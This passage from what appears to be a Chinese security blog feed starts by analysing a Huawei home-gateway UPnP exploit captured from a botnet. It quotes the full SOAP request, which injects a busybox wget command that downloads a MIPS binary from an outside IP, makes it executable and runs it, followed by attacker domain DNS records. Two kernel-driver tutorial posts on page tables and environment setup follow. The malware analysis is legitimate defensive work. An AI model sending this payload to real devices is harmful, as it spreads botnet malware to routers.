src="https://img.joe1sn.top/uploads/big/3331ad455db311c3c1ae6f49c223d273.png" alt="image-20230325175739448" /></p></li></ol></li><li><p>payload分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e</span><br><span class="line">3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line">Content-Length: 457</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">        &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt;</span><br><span class="line">        &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure><p>核心语句</p><p><code>/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei</code></p></li></ul></li></ol><h2 id="网络连接相关"><a class="markdownIt-Anchor" href="#网络连接相关"></a> 网络连接相关</h2><h3 id="dns-server"><a class="markdownIt-Anchor" href="#dns-server"></a> DNS SERVER</h3><table><thead><tr><th><a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a>.</th><th>173.245.59.65 <a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a></th><th>CLOUDFLARENET United States</th></tr></thead><tbody><tr><td><a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a>.</td><td>108.162.194.192 <a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a></td><td>CLOUDFLARENET United States</td></tr></tbody></table><h3 id="host-records-a"><a class="markdownIt-Anchor" href="#host-records-a"></a> Host Records (A)</h3><table><thead><tr><th><a href="http://nguyennghi.info">nguyennghi.info</a>    HTTP: cloudflare</th><th>104.21.78.122</th><th>CLOUDFLARENET unknown</th></tr></thead><tbody><tr><td><a href="http://antiddos.nguyennghi.info">antiddos.nguyennghi.info</a></td><td>103.161.181.140</td><td>DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam</td></tr><tr><td><a href="http://checkht4gvpn.nguyennghi.info">checkht4gvpn.nguyennghi.info</a>    <br>HTTP: cloudflare</td><td>172.67.220.248</td><td>CLOUDFLARENET United States</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="git" scheme="https://joe1sn.eu.org/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 2-页表探索</title>
    <link href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/"/>
    <id>https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</id>
    <published>2023-02-17T07:21:36.000Z</published>
    <updated>2023-06-01T14:36:31.026Z</updated>
    
    <content type="html"><![CDATA[<ul><li>探索CR4</li><li>探索页面<ul><li>CR3寄存器于页遍历</li><li>虚拟地址-&gt;物理地址</li></ul></li></ul><span id="more"></span><h2 id="驱动开发探索cr4"><a class="markdownIt-Anchor" href="#驱动开发探索cr4"></a> [驱动开发]探索CR4</h2><p>英特尔® 64 位和 IA-32 架构开发人员手册合订本</p><p>第3卷第四章第五小节《4-LEVEL PAGING AND 5-LEVEL PAGING》</p><h3 id="判断cpu是四级分页还是五级分页"><a class="markdownIt-Anchor" href="#判断cpu是四级分页还是五级分页"></a> 判断CPU是四级分页还是五级分页</h3><p><img src="https://img.joe1sn.top/uploads/big/52fd7a50c413368bd8a695de90fcd4cd.png" alt="image-20230216154149842" /></p><p>page: 3074</p><p><img src="https://img.joe1sn.top/uploads/big/14c30bac52de0e60030b23bcb577fe75.png" alt="image-20230216155742771" /></p><p><img src="https://img.joe1sn.top/uploads/big/a843d486654ecf31cdcb72aedeec3a00.png" alt="image-20230216160252784" /></p><p>该寄存器的值决定了映射层级是4/5，</p><ul><li>1：5级分页</li><li>0：4级分页</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__readcr4() &amp; 0x1000</span></span><br><span class="line"><span class="comment">//__readcr4() &amp; (1&lt;&lt;12)</span></span><br><span class="line">CR4 Cr4 = &#123; .Value = __readcr4() &#125;;</span><br><span class="line">DbgPrint(<span class="string">&quot;CR4=0x%016I64X, CR4.LA57=%I64d\n&quot;</span>, Cr4.Value, Cr4.Fields.LA57);</span><br><span class="line"><span class="keyword">if</span> (Cr4.Fields.LA57)</span><br><span class="line">    DbgPrint(<span class="string">&quot;The system using 5 Level Paging&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;The system using 4 Level Paging&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="驱动开发探索页面"><a class="markdownIt-Anchor" href="#驱动开发探索页面"></a> [驱动开发]探索页面</h2><h3 id="cr3寄存器于页遍历"><a class="markdownIt-Anchor" href="#cr3寄存器于页遍历"></a> CR3寄存器于页遍历</h3><p>CR3 寄存器设计 <code>CR3[512][512][512][512]</code></p><p><img src="https://img.joe1sn.top/uploads/big/232aa1382631d6a7942c76e6deb33f7c.png" alt="image-20230217100658871" /></p><p>个人觉得这块儿和CSAPP上面讲的差不多</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>页号</mtext><mo>=</mo><mfrac><mtext>页首地址</mtext><mtext>页大小</mtext></mfrac><mo>=</mo><mfrac><mtext>页首地址</mtext><mrow><mn>4</mn><mi>K</mi><mi>B</mi></mrow></mfrac><mo>=</mo><mo>=</mo><mfrac><mtext>页首地址</mtext><msup><mn>2</mn><mn>12</mn></msup></mfrac><mo>=</mo><mo>=</mo><mtext>页首地址</mtext><mo>&gt;</mo><mo>&gt;</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">页号 = \frac{页首地址}{页大小}= \frac{页首地址}{4KB}== \frac{页首地址}{2^{12}}== 页首地址&gt;&gt;12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">号</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">大</span><span class="mord cjk_fallback mtight">小</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.得到CR3寄存器的值，从而得到一级页表地址</span></span><br><span class="line">CR3 Cr3 = &#123; .Value = __readcr3() &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.对每一个一级页读取</span></span><br><span class="line">PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n1 = <span class="number">0</span>; n1 &lt; <span class="number">512</span>; n1++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) <span class="keyword">continue</span>;</span><br><span class="line">        PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;;</span><br><span class="line">        DbgPrint(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="comment">//3.得到二级页表地址</span></span><br><span class="line">        PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger);</span><br><span class="line">    <span class="comment">//4.类似嵌套循环，遍历</span></span><br></pre></td></tr></table></figure><ol><li><p><code>CR3</code>的<code>PPN</code>是第12位，共40bit，所以一级页表是这个值。<code>CR3</code>的尾12位没有用全为0，同时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>4</mn></msup><mo>=</mo><mn>16</mn></mrow><annotation encoding="application/x-tex">2^{4} = 16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span></span></span></span>，那么向右移12位等效于16禁止右移<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>12</mn><mn>4</mn></mfrac><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\frac{12}{4}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>位</p></li><li><p>得到<code>Level_1_PageTable</code>的值过后，可以使用函数<code>MmGetVirtualForPhysical</code>获得该内存地址的值，从而遍历一级页表。要判断当前<code>L1pt.P</code>是否有效，同时<code>L1pt.U_S</code>可以判断该页的权限，详细可以看开发者手册 <code>Table 4-20</code></p><p><img src="https://img.joe1sn.top/uploads/big/fd903a2be055b9552c224180031c3356.png" alt="image-20230217140249814" /></p></li><li><p>依次循环可以遍历完整个内存页（下图中L4pt放不下了）</p></li></ol><p><img src="https://img.joe1sn.top/uploads/big/2fde29bb895532a0e3dbe6caf96b39ab.png" alt="image-20230217134809379" /></p><h3 id="虚拟地址-物理地址"><a class="markdownIt-Anchor" href="#虚拟地址-物理地址"></a> 虚拟地址-&gt;物理地址</h3><p>程序按照4KB分页个数太多不利于实验，可以强制将其分页为1GB，这样便于翻译</p><p><img src="https://img.joe1sn.top/uploads/big/5a04f7c630f2039a36b284c729accfa3.png" alt="image-20230217140941496" /></p><p>编写一个测试程序，该程序能申请出一页的内存，并打印其值</p><p>使用<code>PsGetCurrentProcess</code>获得当前进程<code>PROCESS</code>对象，若相等则不启用新方法</p><p>使用<code>KeStackAttachProcess</code>附加到要翻译的内存的<code>PROCESS</code>对象中，使用老方法输出就OK了，最后<code>KeUnstackDetachProcess</code>脱离</p><ul><li><p>?如何使用按照名字查找进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">QuerySystemInformation</span><span class="params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PVOID Buffer;</span><br><span class="line">    ULONG BufferSize = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, <span class="string">&#x27;bisQ&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!Buffer) <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line"></span><br><span class="line">        Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize);</span><br><span class="line">        <span class="keyword">if</span> (NT_SUCCESS(Status)) &#123;</span><br><span class="line">            *SystemInformation = Buffer;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ExFreePool(Buffer);</span><br><span class="line">        <span class="keyword">if</span> (STATUS_INFO_LENGTH_MISMATCH != Status) <span class="keyword">return</span> Status;</span><br><span class="line">    &#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">LookUpProcessByImageName</span><span class="params">(PCWSTR ImageName, PEPROCESS* Process)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status)) <span class="keyword">return</span> Status;</span><br><span class="line"></span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray;</span><br><span class="line">    UNICODE_STRING ImageNameUnicodeString;</span><br><span class="line">    RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process);</span><br><span class="line">            ExFreePool(ProcessInformationArray);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (CurrentInformation-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ExFreePool(ProcessInformationArray);</span><br><span class="line">            <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致思路和win32下按名称查找PID差不多</p></li><li><p>具体过程</p><p><img src="https://img.joe1sn.top/uploads/big/0fdab9499f3cf26c73a14209daa70aaa.png" alt="image-20230217144908513" /></p><p>这里以<code>0x00000254000003BC  Str1</code> 为例子，加载插件打印，耐心等待。。。</p><p><img src="https://img.joe1sn.top/uploads/big/7d498b364278092281843a4f1d83dab3.png" alt="image-20230217145848060" /></p><p>这时候的数据大小就有83KB了</p><p><code>format(0x00000254000003BC, &quot;064b&quot;)</code>，内存前16位为空是没有用的</p><ul><li><p>高9位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mi>P</mi><mi>N</mi><mn>1</mn><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">VPN1=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span></p><p><code>int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2)</code></p><p><img src="https://img.joe1sn.top/uploads/big/4637e86e487404ab026afbbc26328816.png" alt="image-20230217150603957" /></p></li><li><p>再9位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mi>P</mi><mi>N</mi><mn>2</mn><mo>=</mo><mn>336</mn></mrow><annotation encoding="application/x-tex">VPN2=336</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">3</span><span class="mord">6</span></span></span></span></p><p><code>int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2)</code></p><p><img src="https://img.joe1sn.top/uploads/big/5bda92c2a7cdbea9c04507263f971258.png" alt="image-20230217150709452" /></p><p><strong>该页表的PS=1，则不需要查找下一个页表了</strong>（而且后面也没有了）</p></li><li><p>得到的<code>Pa</code>就是物理页的首地址 + 剩余的30bit位作为<code>VPO</code> = 物理地址</p><p><code>hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2))</code></p><p>得到<code>PA+VPO = 0x1c00003bc</code></p></li><li><p>暂停系统，Windbg -&gt; memory window -&gt; 右键 -&gt; proeries -&gt; physical memory</p><p><img src="https://img.joe1sn.top/uploads/big/5a6dddfa643cdd1d03c716121b4de8f3.png" alt="image-20230217151350113" /></p></li><li><p>尝试修改</p><p><img src="https://img.joe1sn.top/uploads/big/a1166647d16ba21f913e126ca6ea3592.png" alt="image-20230217151439604" /></p><p>再次刷新应该就是<code>1234</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/656aff6ff9e27f5686dfeac7868602d2.png" alt="image-20230217151554657" /></p><p>成功修改</p></li></ul></li></ul><h3 id="官方文档"><a class="markdownIt-Anchor" href="#官方文档"></a> 官方文档</h3><p>2938/4834</p><p><img src="https://img.joe1sn.top/uploads/big/068eed44fe76c0448ad99c95bb66a87d.png" alt="image-20230217151657940" /></p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;探索CR4&lt;/li&gt;
&lt;li&gt;探索页面
&lt;ul&gt;
&lt;li&gt;CR3寄存器于页遍历&lt;/li&gt;
&lt;li&gt;虚拟地址-&amp;gt;物理地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 1-环境搭建</title>
    <link href="https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/"/>
    <id>https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/</id>
    <published>2023-02-16T04:07:43.000Z</published>
    <updated>2023-06-01T14:33:58.629Z</updated>
    
    <content type="html"><![CDATA[<p>简而言之就是</p><ul><li>visual stdio 2019</li><li>windows SDK</li><li>windows WDK</li></ul><p>如果vs没有kernel的项目的模板，找到vs目录的<code>WDK.vsix</code>即可</p><span id="more"></span><h2 id="关于调试"><a class="markdownIt-Anchor" href="#关于调试"></a> 关于调试</h2><p><strong>windbg调试器</strong></p><p>同时windows 虚拟机我使用的是 vmware，添加了一个COM串口</p><p><img src="https://img.joe1sn.top/uploads/big/0e5e407e61b2787fe8d174ee78d786f9.png" alt="img" /></p><p><strong>加载驱动</strong></p><p>使用KmdKit</p><p><strong>windows设置</strong></p><p>msconfig -&gt; 调试 -&gt; COM2 …</p><h2 id="最简单的hello-world"><a class="markdownIt-Anchor" href="#最简单的hello-world"></a> 最简单的hello world</h2><ol><li><p>打开vs，找到KMDF （kernel mode driver empty）</p><p><img src="https://img.joe1sn.top/uploads/big/5a72026aeb132a80141459930266ff2f.png" alt="image-20230216094535591" /></p><p><img src="https://img.joe1sn.top/uploads/big/4a2157b5a902cc4e683bc515976a6dd1.png" alt="image-20230216094619479" /></p></li><li><p>设置驱动项目</p><ul><li><p>取消晚上12点后编译报错</p><p>项目 -&gt; 属性 -&gt; Inf2Cat -&gt; Use Local Time</p></li></ul></li><li><p>代码</p><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 